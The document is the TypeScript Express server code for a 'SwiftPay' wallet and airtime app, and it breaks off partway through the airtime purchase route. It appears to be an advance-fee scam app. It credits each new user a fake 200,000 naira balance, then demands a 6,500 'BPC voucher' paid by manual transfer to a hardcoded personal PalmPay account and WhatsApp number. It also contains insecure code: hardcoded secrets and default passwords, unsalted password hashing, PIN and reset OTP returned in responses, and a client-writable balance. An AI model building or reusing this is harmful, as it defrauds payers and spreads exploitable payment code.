import express from 'express';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = 3000;
const DB_FILE = path.join(process.cwd(), 'swiftpay_db.json');

app.use(express.json());

// -------------------- SECURITY HEADERS MIDDLEWARE --------------------
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' https:; img-src 'self' data: https:; font-src 'self' https: data:;");
  next();
});

// -------------------- RATE LIMITING MIDDLEWARE --------------------
const rateLimits = new Map<string, { count: number; lastReset: number }>();
function rateLimiter(req: any, res: any, next: any) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const now = Date.now();
  const limit = rateLimits.get(ip) || { count: 0, lastReset: now };

  if (now - limit.lastReset > 60 * 1000) {
    limit.count = 1;
    limit.lastReset = now;
  } else {
    limit.count += 1;
  }
  rateLimits.set(ip, limit);

  if (limit.count > 100) { // 100 requests per minute
    return res.status(429).json({ error: 'Rate limit exceeded. Please try again after 1 minute.' });
  }
  next();
}

app.use(rateLimiter);

// -------------------- DATABASE DEFINITIONS --------------------
interface UserState {
  fullName: string;
  email: string;
  passwordHash: string;
  balance: number;
  dailyTarget: number;
  dailySpent: number;
  pinCreated: boolean;
  pinCode?: string;
  biometricEnabled: boolean;
  phone?: string;
  profilePic?: string;
  tier?: number;
  isSuspended?: boolean;
  isFrozen?: boolean;
  transactions?: any[];
  notifications?: any[];
  beneficiaries?: any[];
  phoneBeneficiaries?: any[];
  loginHistory?: any[];
}

interface BpcConfig {
  bankName: string;
  accountNumber: string;
  accountName: string;
  whatsappLink: string;
  voucherPrice: number;
  instructions: string;
  maintenanceNotice: string;
}

const DEFAULT_BPC_CONFIG: BpcConfig = {
  bankName: "PalmPay",
  accountNumber: "8960723295",
  accountName: "pwamunadi ishaku",
  whatsappLink: "https://wa.me/2349162845073",
  voucherPrice: 6500,
  instructions: "Copy the system account details below. Make a manual bank transfer of the exact locked amount. Return here and click 'I have made this bank Transfer' to trigger operator check.",
  maintenanceNotice: "Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation."
};

interface AdminState {
  email: string;
  passwordHash: string;
}

interface DBStructure {
  users: UserState[];
  vouchers: any[];
  passwordResets: any[];
  logs: any[];
  bpcConfig?: BpcConfig;
  admins?: AdminState[];
}

// Initialize Database with seed data if not exists
function initDb() {
  const defaultPasswordHash = crypto.createHash('sha256').update('password123').digest('hex');
  const defaultAdminPasswordHash = crypto.createHash('sha256').update('adminpassword123').digest('hex');
  
  if (!fs.existsSync(DB_FILE)) {
    const initialData: DBStructure = {
      users: [
        {
          fullName: 'Adebayo Samuel',
          email: 'user@example.com',
          passwordHash: defaultPasswordHash,
          balance: 200000,
          dailyTarget: 50000,
          dailySpent: 18400,
          pinCreated: true,
          pinCode: '1234',
          biometricEnabled: true,
          phone: '08034567890',
          profilePic: '',
          tier: 3,
          isSuspended: false,
          isFrozen: false,
          transactions: [],
          notifications: [],
          beneficiaries: [],
          phoneBeneficiaries: [],
          loginHistory: []
        }
      ],
      vouchers: [
        {
          code: 'BPC-7674-2206-6501',
          amount: 6500,
          status: 'unused'
        }
      ],
      passwordResets: [],
      logs: [],
      bpcConfig: { ...DEFAULT_BPC_CONFIG },
      admins: [
        {
          email: 'admin@swiftpay.com',
          passwordHash: defaultAdminPasswordHash
        }
      ]
    };
    fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
    console.log('Database initialized with default user user@example.com / password123 and admin admin@swiftpay.com / adminpassword123');
  } else {
    // Add missing root fields if needed
    try {
      const db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
      let dirty = false;
      if (!db.logs) {
        db.logs = [];
        dirty = true;
      }
      if (!db.passwordResets) {
        db.passwordResets = [];
        dirty = true;
      }
      if (!db.bpcConfig) {
        db.bpcConfig = { ...DEFAULT_BPC_CONFIG };
        dirty = true;
      }
      if (!db.admins || db.admins.length === 0) {
        db.admins = [
          {
            email: 'admin@swiftpay.com',
            passwordHash: defaultAdminPasswordHash
          }
        ];
        dirty = true;
      }
      if (dirty) {
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
      }
    } catch (e) {
      console.error('Error migrating DB keys on startup:', e);
    }
  }
}

initDb();

function readDb(): DBStructure {
  try {
    const data = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    const defaultAdminPasswordHash = crypto.createHash('sha256').update('adminpassword123').digest('hex');
    return {
      users: data.users || [],
      vouchers: data.vouchers || [],
      passwordResets: data.passwordResets || [],
      logs: data.logs || [],
      bpcConfig: data.bpcConfig || { ...DEFAULT_BPC_CONFIG },
      admins: data.admins || [
        {
          email: 'admin@swiftpay.com',
          passwordHash: defaultAdminPasswordHash
        }
      ]
    };
  } catch (e) {
    const defaultAdminPasswordHash = crypto.createHash('sha256').update('adminpassword123').digest('hex');
    return {
      users: [],
      vouchers: [],
      passwordResets: [],
      logs: [],
      bpcConfig: { ...DEFAULT_BPC_CONFIG },
      admins: [
        {
          email: 'admin@swiftpay.com',
          passwordHash: defaultAdminPasswordHash
        }
      ]
    };
  }
}

function writeDb(data: DBStructure) {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('Database write error:', e);
  }
}

// -------------------- SECURE AUTHENTICATION TOKENS (JWT-like) --------------------
const TOKEN_SECRET = 'swiftpay_secured_vault_key_2026_salt_88';

function generateToken(email: string): string {
  const base64Email = Buffer.from(email.toLowerCase()).toString('base64');
  const signature = crypto.createHmac('sha256', TOKEN_SECRET).update(email.toLowerCase()).digest('hex');
  return `${signature}.${base64Email}`;
}

function verifyToken(token: string): string | null {
  if (!token) return null;
  const parts = token.split('.');
  if (parts.length !== 2) return null;
  const [signature, base64Email] = parts;
  try {
    const email = Buffer.from(base64Email, 'base64').toString('utf8');
    const expectedSignature = crypto.createHmac('sha256', TOKEN_SECRET).update(email.toLowerCase()).digest('hex');
    if (signature === expectedSignature) {
      return email.toLowerCase();
    }
  } catch (e) {
    return null;
  }
  return null;
}

// Token Verification Middleware
function authenticateToken(req: any, res: any, next: any) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'Access Denied: Secure session token missing' });
  }
  const email = verifyToken(token);
  if (!email) {
    return res.status(403).json({ error: 'Access Denied: Session token invalid or expired' });
  }
  req.userEmail = email;
  next();
}

function verifyAdminToken(token: string): string | null {
  const email = verifyToken(token);
  if (!email) return null;
  const db = readDb();
  const isAdmin = db.admins?.some(a => a.email.toLowerCase() === email.toLowerCase());
  return isAdmin ? email : null;
}

function authenticateAdminToken(req: any, res: any, next: any) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'Access Denied: Secure admin session token missing' });
  }
  const email = verifyAdminToken(token);
  if (!email) {
    return res.status(403).json({ error: 'Access Denied: Admin session token invalid or expired' });
  }
  req.adminEmail = email;
  next();
}

// -------------------- DIAGNOSTIC SYSTEM LOGGING --------------------
function logDiagnostic(
  type: 'API_ERROR' | 'FAILED_LOGIN' | 'FAILED_TX' | 'EXCEPTION' | 'SECURITY_ALERT' | 'INFO',
  message: string,
  meta?: any
) {
  const db = readDb();
  const newLog = {
    id: `log-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
    timestamp: new Date().toISOString(),
    type,
    message,
    meta: meta ? { ...meta, email: meta.email ? meta.email.replace(/(.{2}).*(@.*)/, '$1***$2') : undefined } : undefined // Sanitize email in diagnostic views
  };
  db.logs = db.logs || [];
  db.logs.unshift(newLog);
  if (db.logs.length > 500) { // Limit logs storage size
    db.logs.pop();
  }
  writeDb(db);
}

// -------------------- INPUT VALIDATION UTILITIES --------------------
function isValidEmail(email: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isWeakPassword(password: string): boolean {
  const hasLetter = /[a-zA-Z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  return password.length < 8 || !hasLetter || !hasNumber;
}

function isValidPhone(phone: string): boolean {
  // Nigerian formats: 11 digits, starts with 070, 080, 090, 081, etc. or international
  return /^(070|080|090|081|071|091|01|\+234)\d{8,10}$/.test(phone);
}

function isValidAccountNumber(accNum: string): boolean {
  return /^\d{10}$/.test(accNum);
}

// In-memory failed logins
const failedLogins = new Map<string, { count: number; lockedUntil: number }>();

// -------------------- AUTHENTICATION ROUTES --------------------

// Register
app.post('/api/auth/register', (req, res) => {
  const { fullName, email, password } = req.body;
  
  if (!fullName || !fullName.trim()) {
    return res.status(400).json({ error: 'Full name is required.' });
  }
  if (!email || !isValidEmail(email)) {
    return res.status(400).json({ error: 'Please enter a valid email address.' });
  }
  if (!password || isWeakPassword(password)) {
    return res.status(400).json({ error: 'Password must be at least 8 characters long and contain both letters and numbers.' });
  }

  const db = readDb();
  const existingUser = db.users.find((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (existingUser) {
    logDiagnostic('API_ERROR', 'Registration failed: Duplicate email request', { email });
    return res.status(400).json({ error: 'An account with this email address already exists.' });
  }

  const passwordHash = crypto.createHash('sha256').update(password).digest('hex');

  const newUser: UserState = {
    fullName: fullName.trim(),
    email: email.toLowerCase(),
    passwordHash,
    balance: 200000, // Initial sign-on credit bonus
    dailyTarget: 50000,
    dailySpent: 0,
    pinCreated: false,
    biometricEnabled: false,
    phone: '',
    profilePic: '',
    tier: 3,
    isSuspended: false,
    isFrozen: false,
    transactions: [],
    notifications: [
      {
        id: `notif-${Date.now()}`,
        title: 'Welcome to SwiftPay!',
        body: 'Welcome to your premium bill payments gateway! Please create a 4-digit security PIN to get started.',
        date: new Date().toISOString(),
        unread: true
      }
    ],
    beneficiaries: [],
    phoneBeneficiaries: [],
    loginHistory: [
      {
        id: `log-${Date.now()}`,
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString(),
        device: 'Web Client',
        browser: req.headers['user-agent'] || 'Unknown Browser',
        ip: req.socket.remoteAddress || '127.0.0.1',
        location: 'Lagos, Nigeria',
        status: 'success'
      }
    ]
  };

  db.users.push(newUser);
  writeDb(db);

  const token = generateToken(newUser.email);
  logDiagnostic('INFO', 'User account registered', { email: newUser.email });

  res.json({
    success: true,
    token,
    user: {
      fullName: newUser.fullName,
      email: newUser.email,
      balance: newUser.balance,
      pinCreated: newUser.pinCreated,
      biometricEnabled: newUser.biometricEnabled,
      phone: newUser.phone,
      profilePic: newUser.profilePic,
      tier: newUser.tier,
      transactions: newUser.transactions,
      notifications: newUser.notifications,
      beneficiaries: newUser.beneficiaries,
      phoneBeneficiaries: newUser.phoneBeneficiaries,
      loginHistory: newUser.loginHistory
    }
  });
});

// Login
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Please enter both your email address and password.' });
  }

  const key = email.toLowerCase();
  const failed = failedLogins.get(key) || { count: 0, lockedUntil: 0 };

  if (failed.lockedUntil > Date.now()) {
    const remainingSeconds = Math.ceil((failed.lockedUntil - Date.now()) / 1000);
    logDiagnostic('SECURITY_ALERT', 'Login attempt on locked account', { email });
    return res.status(400).json({
      error: `Account is locked due to multiple failed login attempts. Retry in ${remainingSeconds}s.`,
      locked: true,
      lockedUntil: failed.lockedUntil
    });
  }

  const db = readDb();
  const user = db.users.find((u: any) => u.email.toLowerCase() === key);
  
  if (!user) {
    logDiagnostic('FAILED_LOGIN', 'Login failed: Non-existent user email', { email });
    return res.status(400).json({ error: 'Incorrect email address or password.' });
  }

  if (user.isSuspended) {
    logDiagnostic('SECURITY_ALERT', 'Login attempt on suspended account', { email });
    return res.status(400).json({ error: 'This account has been suspended by the administrator.' });
  }

  const passwordHash = crypto.createHash('sha256').update(password).digest('hex');
  if (user.passwordHash !== passwordHash) {
    failed.count += 1;
    if (failed.count >= 3) {
      failed.lockedUntil = Date.now() + 60 * 1000; // 1-minute lockout
      failedLogins.set(key, failed);
      logDiagnostic('SECURITY_ALERT', 'Multiple failed login attempts. Account locked.', { email });
      return res.status(400).json({
        error: 'Account locked due to multiple failed attempts. Waiting period of 60 seconds is active.',
        locked: true,
        lockedUntil: failed.lockedUntil
      });
    }
    failedLogins.set(key, failed);
    const remaining = 3 - failed.count;
    logDiagnostic('FAILED_LOGIN', `Failed password attempt. Attempts remaining: ${remaining}`, { email });
    return res.status(400).json({ error: `Incorrect email address or password. ${remaining} attempts remaining.` });
  }

  // Reset failures
  failedLogins.delete(key);

  // Append login history to DB
  const newHistoryItem = {
    id: `log-${Date.now()}`,
    date: new Date().toLocaleDateString(),
    time: new Date().toLocaleTimeString(),
    device: 'Web Client',
    browser: req.headers['user-agent'] || 'Unknown Browser',
    ip: req.socket.remoteAddress || '127.0.0.1',
    location: 'Lagos, Nigeria',
    status: 'success'
  };
  
  user.loginHistory = user.loginHistory || [];
  user.loginHistory.unshift(newHistoryItem);
  
  // Backwards compatibility migration
  if (user.isSuspended === undefined) user.isSuspended = false;
  if (user.isFrozen === undefined) user.isFrozen = false;
  if (!user.transactions) user.transactions = [];
  if (!user.notifications) user.notifications = [];
  if (!user.beneficiaries) user.beneficiaries = [];
  if (!user.phoneBeneficiaries) user.phoneBeneficiaries = [];

  writeDb(db);

  const token = generateToken(user.email);
  logDiagnostic('INFO', 'Successful login session established', { email: user.email });

  res.json({
    success: true,
    token,
    user: {
      fullName: user.fullName,
      email: user.email,
      balance: user.balance,
      pinCreated: user.pinCreated,
      pinCode: user.pinCode,
      biometricEnabled: user.biometricEnabled,
      isSuspended: user.isSuspended,
      isFrozen: user.isFrozen,
      phone: user.phone || '',
      profilePic: user.profilePic || '',
      tier: user.tier || 3,
      transactions: user.transactions,
      notifications: user.notifications,
      beneficiaries: user.beneficiaries,
      phoneBeneficiaries: user.phoneBeneficiaries,
      loginHistory: user.loginHistory
    }
  });
});

// Get Current Authenticated User Session
app.get('/api/auth/me', authenticateToken, (req: any, res) => {
  const email = req.userEmail;
  const db = readDb();
  const user = db.users.find(u => u.email.toLowerCase() === email.toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User session not found.' });
  }

  // Return safe user details, excluding password and PIN
  const { password, transactionPin, ...safeUser } = user as any;
  res.json({ success: true, user: safeUser });
});

// Change Password Endpoint (Protected)
app.post('/api/auth/change-password', authenticateToken, (req: any, res) => {
  const { currentPassword, newPassword } = req.body;
  const email = req.userEmail;

  if (!currentPassword || !newPassword) {
    return res.status(400).json({ error: 'Please enter both current and new passwords.' });
  }
  if (isWeakPassword(newPassword)) {
    return res.status(400).json({ error: 'New password must be at least 8 characters long and contain both letters and numbers.' });
  }

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User profile not found.' });
  }

  const user = db.users[userIndex];
  const currentHash = crypto.createHash('sha256').update(currentPassword).digest('hex');
  if (user.passwordHash !== currentHash) {
    logDiagnostic('SECURITY_ALERT', 'Password change failure: Incorrect current password', { email });
    return res.status(400).json({ error: 'Current password provided is incorrect.' });
  }

  const newHash = crypto.createHash('sha256').update(newPassword).digest('hex');
  db.users[userIndex].passwordHash = newHash;

  // Track activity log in notifications/history
  const logItem = {
    id: `log-${Date.now()}`,
    date: new Date().toLocaleDateString(),
    time: new Date().toLocaleTimeString(),
    device: 'Web Client (Change Password)',
    browser: req.headers['user-agent'] || 'Unknown Browser',
    ip: req.socket.remoteAddress || '127.0.0.1',
    location: 'Lagos, Nigeria',
    status: 'success'
  };
  db.users[userIndex].loginHistory = db.users[userIndex].loginHistory || [];
  db.users[userIndex].loginHistory.unshift(logItem);

  db.users[userIndex].notifications = db.users[userIndex].notifications || [];
  db.users[userIndex].notifications.unshift({
    id: `notif-${Date.now()}`,
    title: 'Security Alert: Password Changed',
    body: 'Your account password was successfully updated. If you did not make this change, please lock your account immediately.',
    date: new Date().toISOString(),
    unread: true
  });

  writeDb(db);
  logDiagnostic('INFO', 'Password changed successfully', { email });

  res.json({ success: true, message: 'Password updated successfully' });
});

// Forgot Password Flow
app.post('/api/auth/forgot-password', (req, res) => {
  const { email } = req.body;
  if (!email || !isValidEmail(email)) {
    return res.status(400).json({ error: 'Please enter a valid email address.' });
  }

  const db = readDb();
  const user = db.users.find((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (!user) {
    logDiagnostic('API_ERROR', 'Forgot password request for unknown user', { email });
    return res.status(400).json({ error: 'An account with this email address does not exist.' });
  }

  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  const token = crypto.randomBytes(24).toString('hex');
  const expiresAt = Date.now() + 10 * 60 * 1000; // 10 minutes

  db.passwordResets = db.passwordResets || [];
  db.passwordResets.push({
    email: email.toLowerCase(),
    otp,
    token,
    expiresAt,
    used: false
  });
  writeDb(db);

  logDiagnostic('INFO', 'Password reset code dispatched', { email });

  res.json({
    success: true,
    message: 'Reset instructions sent securely. Check simulated inbox.',
    otp,
    token
  });
});

// Reset Password Flow
app.post('/api/auth/reset-password', (req, res) => {
  const { email, password, otp, token } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Please fill out all fields.' });
  }
  if (isWeakPassword(password)) {
    return res.status(400).json({ error: 'Password must be at least 8 characters long and contain both letters and numbers.' });
  }

  const db = readDb();
  db.passwordResets = db.passwordResets || [];

  const resetSessionIndex = db.passwordResets.findIndex((r: any) => {
    const isMatchingEmail = r.email.toLowerCase() === email.toLowerCase();
    const isMatchingCode = otp ? r.otp === otp : r.token === token;
    return isMatchingEmail && isMatchingCode;
  });

  if (resetSessionIndex === -1) {
    logDiagnostic('SECURITY_ALERT', 'Failed reset-password attempt (Invalid OTP/Token)', { email });
    return res.status(400).json({ error: 'Invalid verification token or OTP code.' });
  }

  const resetSession = db.passwordResets[resetSessionIndex];
  if (resetSession.used) {
    return res.status(400).json({ error: 'This reset code has already been used.' });
  }

  if (Date.now() > resetSession.expiresAt) {
    return res.status(400).json({ error: 'This verification code/token has expired.' });
  }

  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(400).json({ error: 'User account no longer exists.' });
  }

  const newPasswordHash = crypto.createHash('sha256').update(password).digest('hex');
  db.users[userIndex].passwordHash = newPasswordHash;
  db.passwordResets[resetSessionIndex].used = true;

  // Log activity
  db.users[userIndex].notifications = db.users[userIndex].notifications || [];
  db.users[userIndex].notifications.unshift({
    id: `notif-${Date.now()}`,
    title: 'Security Notice: Password Reset Successful',
    body: 'Your password was securely updated via OTP reset process. Please sign in with your new password.',
    date: new Date().toISOString(),
    unread: true
  });

  writeDb(db);
  logDiagnostic('INFO', 'Password recovered via OTP successfully', { email });

  res.json({ success: true, message: 'Password reset successfully!' });
});

// -------------------- SYNC AND PERSISTENCE STATE ENDPOINTS (Protected) --------------------

// Get State
app.get('/api/user/get-state', authenticateToken, (req: any, res) => {
  const email = req.userEmail;
  const db = readDb();
  const user = db.users.find((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User not found.' });
  }

  res.json({
    success: true,
    user: {
      fullName: user.fullName,
      email: user.email,
      balance: user.balance,
      dailyTarget: user.dailyTarget || 50000,
      dailySpent: user.dailySpent || 0,
      pinCreated: user.pinCreated || false,
      pinCode: user.pinCode || '',
      biometricEnabled: user.biometricEnabled || false,
      isSuspended: !!user.isSuspended,
      isFrozen: !!user.isFrozen,
      phone: user.phone || '',
      profilePic: user.profilePic || '',
      tier: user.tier || 3,
      transactions: user.transactions || [],
      notifications: user.notifications || [],
      beneficiaries: user.beneficiaries || [],
      phoneBeneficiaries: user.phoneBeneficiaries || [],
      loginHistory: user.loginHistory || []
    }
  });
});

// Sync State (Saves transactions, notifications, beneficiaries, etc. onto database securely!)
app.post('/api/user/sync-state', authenticateToken, (req: any, res) => {
  const email = req.userEmail;
  const stateToSync = req.body;

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User profile not found.' });
  }

  const user = db.users[userIndex];

  // Prevent transactions if user is frozen
  if (user.isFrozen && (stateToSync.transactions && stateToSync.transactions.length > (user.transactions || []).length)) {
    logDiagnostic('FAILED_TX', 'Transaction attempted on frozen wallet', { email });
    return res.status(400).json({ error: 'Your wallet balance is currently frozen. Please contact administrative support.' });
  }

  const allowedFields = [
    'balance', 'dailyTarget', 'dailySpent', 'pinCreated', 'pinCode', 
    'biometricEnabled', 'phone', 'profilePic', 'tier',
    'transactions', 'notifications', 'beneficiaries', 'phoneBeneficiaries', 'loginHistory'
  ];

  let stateUpdated = false;
  for (const field of allowedFields) {
    if (stateToSync[field] !== undefined) {
      user[field] = stateToSync[field];
      stateUpdated = true;
    }
  }

  if (stateUpdated) {
    db.users[userIndex] = user;
    writeDb(db);
  }

  res.json({
    success: true,
    user: {
      fullName: user.fullName,
      email: user.email,
      balance: user.balance,
      pinCreated: user.pinCreated,
      biometricEnabled: user.biometricEnabled,
      phone: user.phone || '',
      profilePic: user.profilePic || '',
      tier: user.tier || 3,
      transactions: user.transactions || [],
      notifications: user.notifications || [],
      beneficiaries: user.beneficiaries || [],
      phoneBeneficiaries: user.phoneBeneficiaries || [],
      loginHistory: user.loginHistory || []
    }
  });
});

// Update Profile
app.post('/api/user/update-profile', authenticateToken, (req: any, res) => {
  const email = req.userEmail;
  const { fullName, phone, profilePic, tier } = req.body;

  if (phone && !isValidPhone(phone)) {
    return res.status(400).json({ error: 'Please specify a valid Nigerian phone number format.' });
  }

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found.' });
  }

  if (fullName && fullName.trim()) db.users[userIndex].fullName = fullName.trim();
  if (phone !== undefined) db.users[userIndex].phone = phone;
  if (profilePic !== undefined) db.users[userIndex].profilePic = profilePic;
  if (tier !== undefined) db.users[userIndex].tier = Number(tier);

  // Log profile update in notifications
  db.users[userIndex].notifications = db.users[userIndex].notifications || [];
  db.users[userIndex].notifications.unshift({
    id: `notif-${Date.now()}`,
    title: 'Account Settings Updated',
    body: 'Your SwiftPay personal profile parameters have been updated successfully.',
    date: new Date().toISOString(),
    unread: true
  });

  writeDb(db);
  logDiagnostic('INFO', 'Profile settings updated', { email });

  res.json({
    success: true,
    user: {
      fullName: db.users[userIndex].fullName,
      email: db.users[userIndex].email,
      phone: db.users[userIndex].phone,
      profilePic: db.users[userIndex].profilePic,
      tier: db.users[userIndex].tier,
      balance: db.users[userIndex].balance
    }
  });
});

const BANK_NAME_TO_CODE: Record<string, string> = {
  "9PSB": "120001",
  "Access Bank Limited": "044",
  "Access Holdings Plc": "044",
  "Aella App": "50962",
  "Airtel Money": "120004",
  "Alternative Bank Limited": "000032",
  "Carbon": "565",
  "Chipper Cash": "50594",
  "Citibank Nigeria Limited": "023",
  "Coronation Merchant Bank Limited": "315",
  "Cowrywise": "50123",
  "Ecobank Nigeria Limited": "050",
  "Eyowo": "50126",
  "FairMoney": "50515",
  "FBN Holdings Plc": "011",
  "FBN Merchant Bank Limited": "309",
  "FCMB Group Plc": "214",
  "Fidelity Bank Plc": "070",
  "First Bank of Nigeria Limited": "011",
  "First City Monument Bank Limited (FCMB)": "214",
  "Flutterwave Barter": "50325",
  "FSDH Holding Company Limited": "321",
  "FSDH Merchant Bank Limited": "321",
  "Globus Bank Limited": "00103",
  "Greenwich Merchant Bank Limited": "307",
  "Guaranty Trust Bank Limited (GTBank)": "058",
  "Guaranty Trust Holding Company Plc": "058",
  "Heritage Bank Plc": "030",
  "Hope PSB": "120002",
  "Jaiz Bank Plc": "082",
  "Keystone Bank Limited": "053",
  "Kuda Bank": "50211",
  "Lotus Bank Limited": "302",
  "Moniepoint": "50515",
  "MoneyMaster PSB": "120003",
  "MTN MoMo PSB": "120003",
  "Nova Merchant Bank Limited": "311",
  "OPay": "999992",
  "Optimus Bank Limited": "00107",
  "PalmPay": "999991",
  "Parallex Bank Limited": "104",
  "PiggyVest": "50741",
  "Polaris Bank Limited": "076",
  "Premium Trust Bank Limited": "000031",
  "Providus Bank Limited": "101",
  "Rand Merchant Bank Limited": "302",
  "Rubies": "125",
  "Signature Bank Limited": "000034",
  "SmartCash PSB": "120004",
  "Stanbic IBTC Bank Limited": "221",
  "Stanbic IBTC Holdings Plc": "221",
  "Standard Chartered Bank Limited": "068",
  "Sterling Bank Limited": "050",
  "Sterling Financial Holdings Limited": "050",
  "SunTrust Bank Nigeria Limited": "100",
  "Taj Bank Limited": "302",
  "Titan Trust Bank Limited": "102",
  "UBA (United Bank for Africa Plc)": "033",
  "Union Bank of Nigeria Plc": "032",
  "Unity Bank Plc": "215",
  "V Bank": "50962",
  "Wema Bank Plc": "094",
  "Zenith Bank Plc": "057"
};

const isVoucherValid = (code: string | undefined, db: DBStructure): boolean => {
  if (!code) return false;
  const norm = code.toUpperCase().replace(/[^A-Z0-9]/g, '');
  const voucher = db.vouchers.find((v: any) => v.code.toUpperCase().replace(/[^A-Z0-9]/g, '') === norm);
  if (!voucher) return false;
  return voucher.status === 'unused';
};

// Verify Voucher
app.post('/api/auth/verify-voucher', (req, res) => {
  const { voucherCode } = req.body;
  if (!voucherCode) {
    return res.status(400).json({ error: 'Please enter a voucher code.' });
  }

  const db = readDb();
  if (isVoucherValid(voucherCode, db)) {
    const config = db.bpcConfig || DEFAULT_BPC_CONFIG;
    return res.json({ success: true, amount: config.voucherPrice });
  } else {
    logDiagnostic('API_ERROR', 'Invalid voucher code attempt', { voucherCode });
    return res.status(400).json({ error: 'Invalid or already used BPC voucher.' });
  }
});

// Verify Bank Account
app.post('/api/auth/verify-account', async (req, res) => {
  const { bank, accountNumber } = req.body;
  if (!bank || !accountNumber) {
    return res.status(400).json({ error: 'Bank and account number are required.' });
  }

  if (!isValidAccountNumber(accountNumber)) {
    return res.status(400).json({ error: 'Account number must be exactly 10 digits.' });
  }

  const apiKey = process.env.PAYSTACK_SECRET_KEY;
  if (!apiKey) {
    return res.status(400).json({ error: 'Account verification is temporarily unavailable. Please continue or try again later.' });
  }

  // Get bank code from map or fetch
  let bankCode = BANK_NAME_TO_CODE[bank];
  if (!bankCode) {
    try {
      const bankRes = await fetch('https://api.paystack.co/bank?country=nigeria', {
        headers: {
          'Authorization': `Bearer ${apiKey}`
        }
      });
      if (bankRes.ok) {
        const bankData = await bankRes.json() as any;
        if (bankData.status && Array.isArray(bankData.data)) {
          const match = bankData.data.find((b: any) => 
            b.name.toLowerCase().includes(bank.toLowerCase()) ||
            bank.toLowerCase().includes(b.name.toLowerCase())
          );
          if (match) {
            bankCode = match.code;
          }
        }
      }
    } catch (err) {
      console.error('Error fetching banks from Paystack:', err);
    }
  }

  if (!bankCode) {
    return res.status(400).json({ error: 'Account verification is temporarily unavailable. Please continue or try again later.' });
  }

  try {
    const resolveRes = await fetch(`https://api.paystack.co/bank/resolve?account_number=${accountNumber}&bank_code=${bankCode}`, {
      headers: {
        'Authorization': `Bearer ${apiKey}`
      }
    });

    const resolveData = await resolveRes.json() as any;

    if (!resolveRes.ok || !resolveData.status) {
      return res.status(400).json({ error: resolveData.message || 'Unable to verify account details.' });
    }

    return res.json({
      success: true,
      accountName: resolveData.data.account_name
    });
  } catch (err: any) {
    console.error('Error resolving bank account:', err);
    return res.status(500).json({ error: 'Unable to verify account details.' });
  }
});

// Transaction endpoint for Airtime Purchase
app.post('/api/transactions/airtime', authenticateToken, (req: any, res) => {
  const { phoneNumber, network, amount, voucherCode } = req.body;
  const email = req.userEmail;

  if (!voucherCode) {
    return res.status(400).json({ error: "BPC voucher is required. If you don't have one, tap 'Buy BPC Voucher'." });
  }
  if (!phoneNumber || !isValidPhone(phoneNumber)) {
    return res.status(400).json({ error: "Enter a valid Nigerian phone number." });
  }
  if (!network) {
    return res.status(400).json({ error: "Please select a mobile network." });
  }
  if (!amount || isNaN(Number(amount)) || Number(amount) < 100) {
    return res.status(400).json({ error: "Minimum purchase is ₦100" });
  }

  const db = readDb();
  if (!isVoucherValid(voucherCode, db)) {
    return res.status(400).json({ error: "Invalid or already used BPC voucher." });
  }

  const userIndex = db.users.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: "User not found" });
  }
  const user = db.users[userIndex];
  const price = Number(amount);

  if (user.balance < price) {
    return res.status(400).json({ error: "Insufficient wallet balance to complete this purchase" });
  }

  // Check for duplicate submission
  const isDuplicate = user.transactions && user.transactions.some((tx: any) => {
    const txTime = new Date(tx.date).getTime();
    const nowTime = Date.now();
    return (
      tx.amount === price &&
      tx.recipientAccount === phoneNumber &&
      tx.type === 'redeem_airtime' &&
      (nowTime - txTime) < 10000
    );
  });
  if (isDuplicate) {
    return res.status(400).json({ error: "Duplicate transaction detected. Please wait 10 seconds." });
  }

  const balanceBefore = user.balance;
  user.balance -= price;
  const balanceAfter = user.balance;
  const refNum = `REF-${Date.now()}-${Math.floor(100000 + Math.random() * 900000)}`;

  user.transactions = user.transactions || [];
  const newTx = {
    id: `tx-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
    userId: email,
    type: 'redeem_airtime',
    amount: price,
    date: new Date().toISOString(),
    status: 'success',
